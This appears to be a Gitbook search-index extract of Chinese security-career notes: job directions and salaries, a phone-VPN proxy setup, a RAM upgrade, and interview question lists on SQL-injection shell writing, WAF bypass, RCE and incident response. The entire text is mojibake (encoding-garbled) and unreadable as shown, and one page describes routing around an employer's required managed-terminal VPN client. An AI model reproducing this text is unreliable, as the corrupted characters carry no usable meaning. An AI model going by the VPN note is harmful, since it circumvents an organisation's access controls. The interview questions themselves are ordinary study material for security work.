Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 16:53:23 "},"08.æ‚ä¸ƒæ‚å…«/å®‰å…¨æ–¹å‘.html":{"url":"08.æ‚ä¸ƒæ‚å…«/å®‰å…¨æ–¹å‘.html","title":"å®‰å…¨æ–¹å‘","keywords":"","body":"å¼€å‘ï¼šå®‰å…¨å¼€å‘å’Œæ™®é€šå¼€å‘æ²¡æœ‰å¤ªå¤šçš„åŒºåˆ«ï¼Œå–å†³äºå®‰å…¨å…¬å¸çš„æŠ€æœ¯æ ˆå’Œäº§å“çº¿ï¼Œå¯¹æ ‡ä¸€èˆ¬ä¸­å°å‚è–ªèµ„å’ŒæŠ€æœ¯ã€‚è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯å¾ˆå¤šäº§å“çº¿æ˜¯ä»å¤–é¢ä¹°çš„ï¼Œç”šè‡³å°±å‡ ä¸ªäººåœ¨ç»´æŠ¤å’Œå¼€å‘ï¼Œæ‰€ä»¥æœ‰æ—¶å€™ä½ ä¼šéœ€è¦å»è¯»ä¸€åº§å±å±±ï¼Œè€Œä¸”æ‰¾ä¸åˆ°ä»€ä¹ˆäººå¯¹æ¥ã€‚åˆšæ¯•ä¸šè–ªèµ„åº”è¯¥åœ¨6-10kï¼Œçœ‹åŸå¸‚ä¸Šæµ®ã€‚ çº¢é˜Ÿï¼šé‡å¤´æˆã€‚è¿™ä¸ªæ–¹å‘å›½å†…çš„å°±ä¸šæ˜¯ç”²æ–¹çš„å®‰å…¨ç§å†›å’Œä¹™æ–¹çš„å®‰å…¨å›¢é˜Ÿã€‚ä¸¤è¾¹å…±åŒçš„ç‰¹ç‚¹æ˜¯éœ€è¦æŠ€æœ¯ï¼ŒæŠ€æœ¯è¶Šé«˜è¶Šå¥½ã€‚ç”²æ–¹å®‰å…¨ç§å†›å¤§å¤šè§äºé“¶è¡Œã€è¯åˆ¸ç­‰é‡‘èè¡Œä¸šï¼Œå°‘éƒ¨åˆ†äº’è”ç½‘å…¬å¸ä¹Ÿæœ‰ï¼Œå¤–ä¼è¾ƒå°‘ï¼ˆä¸€ä¸‹å­åªæƒ³å¾—èµ·æ¥ç‰¹æ–¯æ‹‰ï¼‰ã€‚æœ€è¿‘ä¸¤å¹´é¢å¤–å¢åŠ äº†è½¦è”ç½‘æ–¹å‘çš„æ¸—é€ï¼Œåº”è¯¥æ˜¯åˆè§„å¼ºåˆ¶è¦æ±‚ã€‚ä¹™æ–¹ä¹Ÿä¸å¤šï¼Œå„å¤§å®‰å…¨å…¬å¸éƒ½ä¼šå…»æ¸—é€ï¼Œæ¯”è¾ƒå‡ºåçš„æ˜¯ä¸€å“¥çš„A teamå’ŒZ teamã€‚è–ªèµ„éƒ½ä¸ä½ï¼Œæœ¬ç§‘åˆšæ¯•ä¸šçš„è¯æ€»åŒ…15wèµ·æ­¥ï¼Œåˆ°30wå¤šçš„æˆ‘è§è¿‡ï¼Œå†é«˜æ²¡è§è¿‡ã€‚ åŒæ ·ä½ ä¹Ÿå¯ä»¥é€‰æ‹©å•å¹²ï¼Œé€‰è¿™æ¡è·¯æˆ‘ç¥ä½ å¥½è¿ï¼Œhacker oneå’Œè¡¥å¤©ç­‰å„å¤§SOCä¼šæ˜¯ä½ çš„å®¶ã€‚ è“é˜Ÿï¼šå®¹çº³äººæ•°æœ€å¤šçš„è¡Œä¸šï¼Œç”²æ–¹éœ€è¦äººç›¯ç›‘æ§å¹²åˆè§„å¹²æ‚æ´»ï¼Œä¹™æ–¹éœ€è¦äººæ¥å¸®ç”²æ–¹ç›¯ç›‘æ§å¹²æ‚æ´»ã€‚æˆ‘è¿‡å»è·Ÿæœ‹å‹è¯´å®‰å…¨è¡Œä¸šå…¶å®ä¸ç®—å¤ªå·®ï¼Œå°±æ˜¯å› ä¸ºè¿™ä¸ªäººæ•°æœ€å¤šçš„å…œåº•å²—ä½æ¯”å…¶ä»–è¡Œä¸šçš„å…œåº•å²—ä½è¦å¥½å¤ªå¤šäº†ã€‚äº‹ä¸å¤šï¼Œå·¥èµ„ç›¸å¯¹é«˜ï¼Œè€Œä¸”é—¨æ§›ä¸é«˜ã€‚æˆ‘ä¼šå»ºè®®ä½ æ‰¾ä¸ªå¤§å…¬å¸åšå®‰å…¨ï¼Œä¸€èˆ¬ä¸€ä¸ªäººè´Ÿè´£è¿™æ•´ä¸ªéƒ¨åˆ†ï¼Œè½»æ¾ã€ç¨³å®šï¼Œå·¥èµ„åˆšæ¯•ä¸šå¤§æ¦‚åœ¨7-9kï¼ŒéšåŸå¸‚å’Œå…¬å¸ä¸Šæµ®ã€‚å¦‚æœåˆšæ¯•ä¸šå°±è¿›ä¹™æ–¹çš„è¯å°±æœ‰ç‚¹ç‚¹ç³Ÿç³•äº†ï¼Œ6-8kå¹¶ä¸”ä¸ç¨³å®šï¼Œæ‰¾æœºä¼šè·³ç”²æ–¹å§ã€‚ å®‰å…¨ç ”ç©¶ï¼šè¿™ä¸ªä½ å¯èƒ½æš‚æ—¶ä¸è¦æƒ³ï¼Œè¿™åŸºæœ¬æ˜¯ç§‘ç ”å’Œä¸€éƒ¨åˆ†çº¢é˜Ÿåœ¨åšï¼Œå…¸å‹è§äºå„å¤§å®‰å…¨å…¬å¸çš„å·¥ä½œå®¤ï¼Œç¡•å£«èµ·æ­¥æˆ–è€…å¯¹è¿™æ–¹é¢æœ‰å¾ˆæ·±çš„ç ”ç©¶ï¼Œç›®æ ‡æ˜¯åˆ·å¥–å’Œæ„Ÿè°¢ä¿¡ï¼Œä¸ºå…¬å¸æŒ£é¢å­ã€‚è–ªèµ„ä¸é€æ˜ï¼Œä¸€ä¸ªä¸ªéƒ½ç’å¾ˆç´§ï¼Œæˆ‘æ²¡ç»†é—®ã€‚ åˆè§„å®¡æ ¸ï¼šæœ€å…¸å‹çš„å°±æ˜¯ç­‰ä¿ï¼ˆå¯†è¯„å¥½åƒå¿«å¼ºåˆ¶äº†ï¼‰ï¼Œå…¶å®å¯ä»¥æ‹†è¿›ä¹™æ–¹å®‰å…¨è¿è¥é‡Œé¢ã€‚è¿™æ–¹é¢å¸‚åœºä¸å¤§ä¸å°ï¼Œä¸€èˆ¬æ˜¯å¤§å…¬å¸çš„ä¸€ä¸ªåˆ†æ”¯ä¸šåŠ¡ï¼Œæˆ–è€…ä¸­å°å…¬å¸åœ¨åšï¼Œè€ƒä¸€ä¸ªè¯ï¼ˆ27001å®¡æ ¸ï¼Œç­‰ä¿æµ‹è¯„å¸ˆï¼Œå¯†è¯„æµ‹è¯„å¸ˆç­‰ï¼‰ç„¶åè¿›å»åšå°±å®Œäº‹ã€‚æ²¡æœ‰ä»€ä¹ˆç§¯ç´¯ï¼Œå‡ºå·®éå¸¸é¢‘ç¹ï¼Œå»ºè®®æ˜¯ä¸åˆ°ä¸‡ä¸å¾—å·²ä¸è¦åšã€‚è–ªèµ„è¿˜ä¸é”™çš„ï¼Œ6-8kéšåŸå¸‚å’Œé¡¹ç›®ä¸Šæ¶¨ã€‚ äºŒè¿›åˆ¶ç›¸å…³ï¼šè¿™ä¸ªæ–¹å‘å•ç‹¬æå‡ºæ¥æ˜¯å› ä¸ºéš¾ã€‚è™½ç„¶ç†è®ºä¸Šå­¦æ ¡é‡Œä¼šæ•™ä¸€äº›ï¼Œä½†æ˜¯çœŸè¦å…¥é—¨é‚£è¦è€å¾—ä½å¯‚å¯ã€‚é—¨æ§›é«˜ï¼Œéœ€æ±‚å°‘ï¼Œä½†æ˜¯æ”¶å…¥é«˜ï¼Œæˆå°±ä¹Ÿå¥½ã€‚ å¯†ç å­¦ï¼šæ‰€æœ‰å®‰å…¨æ–¹å‘éƒ½ä¼šç€é‡å¼€å¯†ç å­¦çš„è¯¾ï¼Œä½†æ˜¯è¿™ç¡®å®æ˜¯ä¸ªå¯¹äºå°±ä¸šæ²¡æœ‰ä»»ä½•å¸®åŠ©çš„æ–¹å‘ã€‚æœ€å¹½é»˜çš„å°±æ˜¯å›½å†…ç¡•å¯¼æ™®éå¾ˆæ°´ï¼Œä½†æ˜¯ä¸ºäº†ä¸æ˜¾ç¤ºå‡ºè‡ªå·±å®Œå…¨æ²¡æœ‰å®é™…ç»éªŒå’ŒæŠ€æœ¯ï¼Œä»–ä»¬å°±å¿…é¡»æ‰¾ä¸ªæ–¹å‘æ·±å…¥ã€‚æ¸—é€æ²¡ç»éªŒï¼Œå†…æ ¸å¤ªéš¾ï¼Œå®‰è§„è¦èµ„æºï¼Œæœ€åä¸€çœ‹ï¼Œå˜¿ï¼Œå°±å¯†ç å­¦å¥½ç³Šå¼„ã€‚äºæ˜¯å¯¼è‡´äº†ç°åœ¨å›½å†…ç¡•å£«ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå¤§æ‰¹é‡åœ¨æ°´å¯†ç å­¦ç›¸å…³çš„ç ”ç©¶ï¼Œæœ¬ç§‘ä¹Ÿåœ¨å¼ºè°ƒè¿™é—¨è¯¾ã€‚æˆ‘å¯¹æ­¤çš„å»ºè®®æ˜¯ä¸è¦ç¢°ï¼Œäº†è§£ä¸‹åŸºæœ¬æ¦‚å¿µå°±å®Œäº‹äº†ã€‚ æˆ‘æš‚æ—¶èƒ½æƒ³åˆ°çš„æ–¹å‘å°±è¿™äº›ã€‚æ¥ä¸‹æ¥æ˜¯ä¸€äº›å®é™…çš„å»ºè®®ã€‚ æˆ‘å¾ˆç†è§£ä½ çš„è¿·èŒ«ï¼ŒæŠ€æœ¯ä¸€èˆ¬ï¼Œçœ¼çœ‹ç€æ²¡æ³•åƒæ¸—é€é¥­ï¼Œä½†æ˜¯å¸‚åœºä¸Šåˆåœ¨å¼ºè°ƒä¿¡æ¯å®‰å…¨å°±ä¸šå¥½æƒ³è¦é è¿™ä¸ªå¼¯é“è¶…è½¦ã€‚æ‰€ä»¥æˆ‘å»ºè®®ä½ ä¸¤æ‰‹å‡†å¤‡ï¼Œä»£ç æ˜¯ä¸€åˆ‡çš„åŸºç¡€ï¼Œä½ ä»£ç èƒ½åŠ›å¤Ÿå¥½åœ¨å®‰å…¨æ–¹é¢æ··é¥­åƒä¹Ÿä¼šå¾ˆå®¹æ˜“ï¼Œæ‰€ä»¥ä½ çš„ç¼–ç¨‹èƒ½åŠ›ç»å¯¹ä¸èƒ½ä¸¢ã€‚ä½†åŒæ—¶ä¹Ÿè¦ç€çœ¼äºç”²æ–¹å®‰å…¨è¿è¥ã€ç”²æ–¹æ¸—é€ã€å®‰å…¨å¼€å‘è¿™ä¸‰ä¸ªæ–¹å‘ã€‚å°½å¯èƒ½å»bossæˆ–è€…å…¶ä»–è½¯ä»¶çœ‹JDï¼Œçœ‹å¤§é‡çš„JDï¼ŒæŒ‰ç…§å¤§å…¬å¸çš„æŠ€æœ¯æ–¹å‘å»è°ƒæ•´ä½ çš„æŠ€æœ¯æ ˆã€‚è¿™ä¸‰ä¸ªæ–¹å‘åªè¦ä½ å…¥è¡Œï¼Œéƒ½èƒ½å¤Ÿä¿è¯ä½ æ¯”æ™®é€šå¼€å‘æ›´èƒ½æ··é¥­åƒã€‚è€Œæå‰å‡†å¤‡æŠ€æœ¯æ ˆèƒ½å¤Ÿåœ¨ä½ è·¨è¿‡å­¦å†é—¨æ§›ä¹‹åå¿«é€Ÿè®©å¤§å…¬å¸å¯¹ä½ æ„Ÿå…´è¶£ï¼Œæ›´å®¹æ˜“è¿›å»ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 23:14:33 "},"08.æ‚ä¸ƒæ‚å…«/æ‰‹æœºVPNå…±äº«.html":{"url":"08.æ‚ä¸ƒæ‚å…«/æ‰‹æœºVPNå…±äº«.html","title":"æ‰‹æœºVPNå…±äº«","keywords":"","body":" èµ·å› ï¼šPCè¿æ¥å†…ç½‘éœ€è¦åœ¨å®‰è£…ç®¡æ§ç»ˆç«¯ä¸‹ä½¿ç”¨VPNï¼Œæ‰‹æœºä¸éœ€è¦ï¼Œä½†æ˜¯æ‰‹æœºä¸å¥½è¿›è¡Œæ“ä½œ å®‰è£…proxy server ç‚¹å‡»å·¦ä¸Šè§’addæ·»åŠ proxy serverï¼Œåªéœ€è¦å¡«å†™æœåŠ¡å™¨åå­—åè¿”å›ä¿å­˜å³å¯ startå¯åŠ¨ ç”µè„‘ä»£ç†è®¾ç½®ï¼Œæ‰‹æœºIPå¯ä»¥ç‚¹å‡»infoæŸ¥çœ‹ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 17:10:11 "},"08.æ‚ä¸ƒæ‚å…«/æ¢å†…å­˜æ¡.html":{"url":"08.æ‚ä¸ƒæ‚å…«/æ¢å†…å­˜æ¡.html","title":"å¦‚ä½•æ›´æ¢å†…å­˜æ¡","keywords":"","body":" å¥½å¤šå¹´å‰çš„ç”µè„‘äº†ï¼Œå†…å­˜æœ‰ç‚¹ä¸å¤Ÿï¼Œå†…ç½‘é¶åœºå¼€ä¸èµ·æ¥ğŸ˜­ å¦‚ä½•é€‰æ‹©é€‚åˆç”µè„‘çš„å†…å­˜æ¡ å·¥å…· CPU-Z | Softwares | CPUID AIDA64 v6.92.6600 ä¾¿æºç‰ˆ - æœæ ¸å‰¥å£³ (ghxi.com) å…³æ³¨ä¿¡æ¯ æ”¯æŒçš„å†…å­˜æ¡ç±»å‹å’Œæœ€å¤§å†…å­˜å¤§å° å‡ ä¸ªæ’æ§½ï¼ˆæ”¯æŒå‡ æ¡å†…å­˜æ¡ï¼‰ å†…å­˜æ¡é¢‘ç‡ è¿™é‡Œçœ‹åˆ°çš„æ˜¯800MHZï¼Œå®é™…ä¸Šæ˜¯1600MHZï¼Œåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ° å†…å­˜é¢‘ç‡åªæœ‰ä¸€åŠï¼Ÿåˆ«æ€¥ ç³»ç»Ÿåªæ˜¯å‘Šè¯‰äº†ä½ äº‹å® - çŸ¥ä¹ (zhihu.com) åˆ¶é€ å•†ï¼šç»„åŒé€šé“æœ€å¥½ä¸€è‡´ ç”µå‹ ä½ç”µå‹ï¼š1.35V æ ‡å‡†ç”µå‹ï¼š1.5V ç»¼ä¸Šæˆ‘æœ€å¥½å»äº¬ä¸œä¸Šè´­ä¹°DDR3è§„æ ¼ï¼Œæµ·åŠ›å£«å“ç‰Œï¼Œå†…å­˜æ¡é¢‘ç‡ä¸º1600MHZï¼Œä½ç”µå‹ï¼Œå†…å­˜å¤§å° è£…å†…å­˜æ¡ çº¢æ¡†å¤„å³ä¸ºå†…å­˜æ¡ çº¢æ¡†å¤„å‘å¤–æ‹‰ï¼Œå–å‡ºå†…å­˜æ¡ï¼Œç„¶åæ–°å†…å­˜æ¡30Â°æ’å…¥ç®­å¤´æ‰€æŒ‡åï¼Œç”¨ç‚¹åŠ›å‘ä¸‹å‹ï¼Œå¬åˆ°å“’çš„ä¸€å£°å°±OKäº† å†…å­˜æˆåŠŸå˜ä¸º16GB Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:47:58 "},"08.æ‚ä¸ƒæ‚å…«/é¢è¯•è®°å½•.html":{"url":"08.æ‚ä¸ƒæ‚å…«/é¢è¯•è®°å½•.html","title":"ç¬”/é¢è®°å½•","keywords":"","body":"HWé¢è¯• å¤§æ¦‚æ˜¯ä¸‰æ¬¡é¢è¯•çš„é›†åˆå»äº†é‡çš„ï¼Œç»“æœè¿˜æ˜¯å»äº†å®ä¹  è‡ªæˆ‘ä»‹ç» ä¹‹å‰æŠ¤ç½‘ä¸»è¦åšä»€ä¹ˆ è®¾å¤‡ä½¿ç”¨ ç”¨è¿‡å“ªäº›å®‰å…¨è®¾å¤‡ï¼Œå…·ä½“äº§å•†ï¼Œå…·ä½“æ€ä¹ˆç”¨ï¼ˆè¯­æ³•æ˜¯ä»€ä¹ˆï¼‰ è´Ÿè´£å¤–ç½‘è¿˜æ˜¯å†…ç½‘ï¼Œæœ‰å¾ˆå¤šè¯¯æŠ¥æ€ä¹ˆåŠ å¦‚ä½•åˆ¤æ–­æ”»å‡»æˆåŠŸ sqlæ³¨å…¥ç›¸å…³ sqlæ³¨å…¥åŸç†ï¼Œæ–¹å¼ï¼Œé˜²å¾¡æ‰‹æ®µ å®½å­—èŠ‚æ³¨å…¥åŸç† sqlå†™shellçš„æ¡ä»¶ï¼Œå…·ä½“çš„è¯­å¥ï¼ˆè¿½é—®ï¼šé™¤äº†ç›´æ¥å†™å…¥è¿˜æœ‰å…¶ä»–æ–¹æ³•å—) sqlmapå†™shellçš„å‚æ•°å’ŒåŸç† ä½¿ç”¨sqlmap postæ³¨å…¥çš„å‚æ•° sqlæ³¨å…¥ç»•è¿‡wafçš„æ–¹å¼ sqlæ³¨å…¥å»¶æ—¶æ³¨å…¥æ—¶ï¼Œsleepå‡½æ•°è¢«ç¦ç”¨äº†æ€ä¹ˆåŠ æ¸—é€æµ‹è¯•æµç¨‹ä»ä¿¡æ¯æ”¶é›†å¼€å§‹å®Œæ•´åœ°è®²è®² xxeæœ‰å“ªäº›åˆ©ç”¨æ–¹å¼ ç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œthinkphpï¼Œå¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰ç™½åå•åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œæ€ä¹ˆrce äº†è§£è¿‡burpçš„dnsåŠŸèƒ½å— è¿½é—®ï¼š çœ‹è¿‡dnslogæ—¥å¿—å— è®²ä¸€ä¸‹æŒ–çŸ¿æœ¨é©¬çš„å¤„ç½® è¿½é—®ï¼š è¦ç”¨ä»€ä¹ˆå‘½ä»¤å®šä½è¿›ç¨‹æ‰€å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ æ–°å¢ç”¨æˆ·æ€ä¹ˆæ’æŸ¥ï¼ˆwindowså’Œlinuxï¼‰ ç”¨ä»€ä¹ˆå‘½ä»¤æ’æŸ¥linuxçš„ç‰¹æƒç”¨æˆ· ä¸€ç›´æ€ä¸æ‰æ€ä¹ˆåŠï¼ˆè¦çœ‹å“ªäº›æ–‡ä»¶/ç›®å½•ï¼‰ javaå†…å­˜é©¬ç±»å‹ è¿½é—®ï¼š å„è‡ªåŸç† å†°èçš„æœ¨é©¬åŸç†äº†è§£è¿‡å— æ¸—é€ä¸­å¦‚æœæœºå™¨ä¸å‡ºç½‘æ€ä¹ˆåŠ è¿½é—® ç”¨çš„ä»€ä¹ˆåå‘ä»£ç† å¦‚æœå¯ä»¥rceï¼Œä½†æ˜¯æ— å›æ˜¾å¹¶ä¸”ä¸å‡ºç½‘æ€ä¹ˆåŠ å¦‚æœæœºå­è¢«ä¸Šäº†csæœ¨é©¬ï¼Œæ€ä¹ˆæ£€æµ‹å‡ºæœ¨é©¬è¿›ç¨‹ wiresharkç”¨è¿‡å— å‡è®¾ä¸Šä¼ äº†webshellï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨webshellç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥ï¼Œè®²ä¸€ä¸‹è¿™äº›ç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾ è®²ä¸€ä¸‹javaçš„shiroï¼Œlog4jç­‰æ¼æ´ æœ‰åšè¿‡æº¯æºå—ï¼Œäº†è§£çš„è¯´è¯´ ç®€å†ä¸Šè¯´æŒ–æ˜è¿‡é€»è¾‘æ¼æ´ï¼Œç°åœ¨ç»™ä½ ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½ æœ‰ä»€ä¹ˆæ€è·¯ å‡è®¾æœ‰ä¸€ä¸ªå­˜å‚¨å‹xssï¼Œæ€ä¹ˆè¿›è¡ŒæŒä¹…åŒ– å¦‚æœé€šçŸ¥æœºå™¨ä¸Šå‡ºç°äº†ä¸€äº›å¯ç–‘çš„æ–‡ä»¶å’Œç›®å½•ï¼Œæ€ä¹ˆè¿›è¡Œåº”æ€¥å“åº” è®²ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ é»‘ç™½åå•ç»•è¿‡ è¿½é—® ä¸­é—´ä»¶è§£ææ¼æ´è®²è®² ä¸»æœºåŸºçº¿è§„èŒƒè®²ä¸€ä¸‹ å¦‚æœæŠ¤ç½‘æœŸé—´å‡ºç°äº†0dayè¯¥æ€ä¹ˆåŠ è®²ä¸€ä¸‹å†…ç½‘ä¸­çš„ç¥¨æ® windowsäº‹ä»¶çŠ¶æ€ç  æ¸—é€æµ‹è¯•å®ä¹  è‡ªæˆ‘ä»‹ç» è®²ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´ dnslogäº†è§£å—ï¼Œæ˜¯åœ¨å‘½ä»¤æœ‰å›æ˜¾è¿˜æ˜¯æ— å›æ˜¾çš„æ—¶å€™ç”¨ dnslogå’Œåå¼¹shellæœ‰ä»€ä¹ˆåŒºåˆ« ä¸€å¥è¯æœ¨é©¬å’Œå†…å­˜é©¬æœ‰ä»€ä¹ˆåŒºåˆ« å¸¸è§çš„wafç»•è¿‡æ–¹å¼ æ–‡ä»¶ä¸Šä¼ è®²è®² é€»è¾‘æ¼æ´çŸ¥é“å“ªäº› æœªæˆæƒè®¿é—®æ¼æ´ä½ æ˜¯æ€ä¹ˆæŒ–åˆ°çš„ sqlæ³¨å…¥ä½ ä¼šç”¨åˆ°å“ªäº›å‡½æ•° springæ¡†æ¶æ¼æ´ é˜¿é‡Œçš„druidäº†è§£å— dockerå®¹å™¨æ¼æ´ï¼Œåœ¨å®æˆ˜ä¸­æœ‰é‡è§è¿‡å— weblogicæ¡†æ¶æ¼æ´ çŸ¥é“å“ªäº›CMS è‹¥ä¾CMSæ¼æ´çŸ¥é“å— 2022å¹´ä»¥åçš„æ¼æ´çŸ¥é“å“ªäº› ä½ äº†è§£æˆ‘ä»¬å…¬å¸å— ä½ æ€ä¹ˆçœ‹å¾…åŠ ç­ ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯• æŸæ¸¸æˆå‚ï¼Œç»å¤§éƒ¨åˆ†éƒ½æ˜¯æ•°æ®ç»“æ„ï¼Œæ¦‚ç‡ç»Ÿè®¡ï¼Œç®—æ³•ï¼Ÿï¼Ÿï¼Ÿ Webå®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯• â€œ`â€ç¬¦å·ï¼ˆåå•å¼•å·ï¼‰åœ¨PHPè¯­è¨€ä»¥åŠSQLè¯­è¨€ä¸­çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆ Pythonè¯­å¥'int'.__class__çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Œè¯¥è¯­å¥å’Œä»€ä¹ˆæ¼æ´æœ‰å…³ Javaä¸­çš„åå°„æœ‰ä»€ä¹ˆä½œç”¨ Javaååºåˆ—åŒ–çš„åŸºæœ¬åŸç† SSRFæ¼æ´æœ‰ä»€ä¹ˆæ¼æ´åˆ©ç”¨æ€è·¯ï¼Ÿ åˆ©ç”¨XSSæ¼æ´å¯ä»¥è¾¾åˆ°ä»€ä¹ˆæ•ˆæœï¼Ÿæœ‰å“ªäº›é˜²å¾¡XSSæ¼æ´çš„æ‰‹æ®µ/æœºåˆ¶ï¼Ÿ è”åˆæŸ¥è¯¢æ³¨å…¥å¦‚ä½•åˆ¤æ–­è¡¨ä¸­åˆ—çš„æ•°é‡ï¼ˆé™¤äº†ä½¿ç”¨order byï¼‰ æè¿°ä¸€ä¸‹SQLäºŒæ¬¡æ³¨å…¥æ¼æ´çš„åŸç† æè¿°ä¸€ä¸‹PHPååºåˆ—åŒ–æ¼æ´çš„åŸç† JWTæ˜¯ä»€ä¹ˆï¼›Cookieå’ŒSessionçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ æè¿°ä¸€ä¸‹Shiro550æ¼æ´çš„åŸç† sqlmap --os-shellå‚æ•°åˆ†åˆ«åœ¨é¢å¯¹MySQLå’ŒMSSQLæ•°æ®åº“ä¸­æ‰§è¡Œçš„åŸç† sqlmapä¸­--techniqueå’Œ--dbmså‚æ•°çš„å«ä¹‰æ˜¯ä»€ä¹ˆ nmapä½¿ç”¨å“ªä¸ªå‚æ•°å¯ä»¥åšåˆ°å¯¹ç›®æ ‡åªæ¢æµ‹å­˜æ´»ï¼Œä½†ä¸è¿›è¡Œç«¯å£æ‰«æ 22ã€1433ã€1521ã€2375ã€3306ã€3389ã€6379ã€7001ç«¯å£å¯¹åº”çš„æœåŠ¡åç§°åˆ†åˆ«æ˜¯ä»€ä¹ˆ æè¿°ä¸€ä¸‹Redisæœªæˆæƒè®¿é—®æ¼æ´çš„åˆ©ç”¨æ–¹å¼ æƒ³é€šè¿‡SQLæ³¨å…¥æ¼æ´å†™shellï¼ˆè¢«æ”»å‡»ç›®æ ‡æ˜¯MySQLã€Apacheã€PHPï¼‰ï¼Œéœ€è¦è¢«æ”»å‡»æ–¹æ»¡è¶³ä»€ä¹ˆæ¡ä»¶ï¼ŸMySQLä¸­ï¼Œå¯ä»¥å†™å…¥æ–‡ä»¶çš„ä¸¤æ¡æŒ‡ä»¤åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸¤æ¡æŒ‡ä»¤çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ å‡­å°è±¡åˆ—ä¸¾å‡ ä¸ªä¸¾ä¸–é—»åçš„æ¼æ´åç§°åŠå…¶CVEç¼–å· å¯¹äºæ¸—é€ä¸­å¸¸è§çš„ä¸­é—´ä»¶ã€æ¡†æ¶æˆ–ç»„ä»¶ï¼Œä½ ä¼šç”¨ä»€ä¹ˆå·¥å…·å»å¯¹ä»–è¿›è¡Œæ¼æ´æ‰«æï¼Ÿ(å…·ä½“åˆ°ä¸­é—´ä»¶ã€æ¡†æ¶æˆ–ç»„ä»¶åŠå¯¹åº”å·¥å…·çš„åç§°) å¦‚æœå‘ç°äº†ç½‘ç«™æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä½ æ¥ä¸‹æ¥æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ å¯¹äºé“¾æ¥demo.do?DATA=dWlkPTE2==ï¼Œä½ æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ æ‰«ç›®å½•å‘ç°swagger.jsonï¼Œä½ æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ é‡åˆ°åªæœ‰ä¸€ä¸ªç™»å½•æ¡†é¡µé¢çš„ç½‘ç«™ï¼Œä½ æœ‰å“ªäº›æµ‹è¯•æ€è·¯ æè¿°å¯¹æ‰‹æœºAppï¼ˆAndroid/IOSï¼‰è¿›è¡Œæµ‹è¯•çš„æ€è·¯å’Œåšæ³• å…·ä½“åˆ°å·¥å…·çš„åç§° æè¿°å¯¹å¾®ä¿¡å°ç¨‹åºè¿›è¡Œæµ‹è¯•çš„æ€è·¯å’Œåšæ³• ç»™ä½ å•ä¸ªIPåœ°å€ï¼Œè®©ä½ å¯¹å®ƒè¿›è¡Œå…¨é¢çš„æ¸—é€æµ‹è¯•ï¼Œä½ çš„æ€è·¯å’Œåšæ³•æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæ­¤å¤„å†™æ˜ä½ ä¼šä½¿ç”¨åˆ°çš„å·¥å…·çš„åç§°ã€‚æ¯”å¦‚ä¸è¦åªè¯´â€œä½¿ç”¨å·¥å…·è¿›è¡Œæ¼æ´æ‰«æâ€ï¼Œå…·ä½“åˆ°ï¼šâ€œä½¿ç”¨xxxå·¥å…·è¿›è¡Œæ¼æ´æ‰«æâ€ ï¼‰ è·å–åˆ°è¾¹ç•ŒæœåŠ¡å™¨çš„æƒé™åï¼Œæœ‰å“ªäº›æ–¹æ³•å¯ä»¥å¿«é€Ÿæ‰¾å‡ºå†…ç½‘ä¸­å¯èƒ½å­˜æ´»çš„ä¸»æœº Windowså’ŒLinuxä½¿ç”¨å‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶çš„æ–¹å¼åˆ†åˆ«æœ‰å“ªäº›ï¼Ÿï¼ˆå¯ä»¥åªå†™å‘½ä»¤çš„åç§°ï¼Œä¸ç”¨å†™å…¨å‘½ä»¤å®Œæ•´å‚æ•°ï¼‰ æè¿°ä½ å¸¸ç”¨çš„ç«¯å£è½¬å‘åŠä»£ç†éš§é“çš„æ­å»ºæ–¹å¼ xrayæ˜¯å“ªå®¶å…¬å¸å¼€å‘çš„ï¼Œæ˜¯ç”¨ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼Ÿgobyæ˜¯å“ªå®¶å…¬å¸å¼€å‘çš„ï¼Œæ˜¯ç”¨ä»€ä¹ˆè¯­è¨€å†™çš„ï¼Ÿ æè¿°ä¸€ä¸‹ä½ çš„ä¼˜åŠ¿ ï¼Œä»¥åŠèƒ½ä¸ºå…¬å¸åˆ›é€ ä»€ä¹ˆä»·å€¼ è¯·è°ˆä¸€è°ˆä½ çš„èŒä¸šè§„åˆ’ è¯·ä»‹ç»ä¸‹ä½ çš„æ€§æ ¼ è¯·ä»‹ç»ä¸€ä¸‹ä½ å¯¹äºç½‘ç»œå®‰å…¨å­¦ä¹ çš„çƒ­æƒ… å®‰æœ/æ¸—é€ç¬”è¯• 